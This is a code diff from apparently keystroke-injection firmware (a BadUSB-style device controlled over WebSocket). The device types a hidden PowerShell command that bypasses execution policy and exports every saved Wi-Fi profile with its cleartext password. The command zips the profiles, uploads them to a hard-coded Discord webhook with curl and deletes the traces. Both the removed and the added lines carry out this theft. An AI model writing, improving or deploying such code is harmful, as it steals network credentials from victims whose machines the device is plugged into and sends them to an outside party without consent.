@@ -651,17 +651,16 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(1000);
         Keyboard.print(
             "powershell -w h -nop -ep bypass -c \""
-            "$f=$env:TEMP+'\\w.txt';"
-            "$p=(netsh wlan show profiles) -match ':(.+)$' | %{$_.Matches.Groups[1].Value.Trim()};"
-            "foreach($n in $p){"
-            "$k=(netsh wlan show profile name=\\\"$n\\\" key=clear | Select-String -Pattern ':\\s([^\\s]+)$' | Select -Last 1).Matches.Groups[1].Value.Trim();"
-            "if($k){ \\\"$n : $k\\\" >> $f }else{ \\\"$n : NoKey\\\" >> $f }"
-            "};"
-            "curl.exe -F ('file=@'+$f) "
+            "$w=$env:TEMP+'\\WIFI';"
+            "mkdir $w -Force;"
+            "netsh wlan export profile key=clear folder=$w;"
+            "Compress-Archive -Path $w\\* -DestinationPath $w.zip -Force;"
+            "curl.exe -F ('file=@'+$w+'.zip') "
             "https://discord.com/api/webhooks/1480962111373840517/"
             "0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-"
             "ciyqaBjdfxN4zgmmvD3;"
-            "Remove-Item $f\" & exit");
+            "Remove-Item $w -Recurse -Force;"
+            "Remove-Item ($w+'.zip') -Force\" & exit");
         delay(300);
         Keyboard.press(KEY_RETURN);
         delay(20);
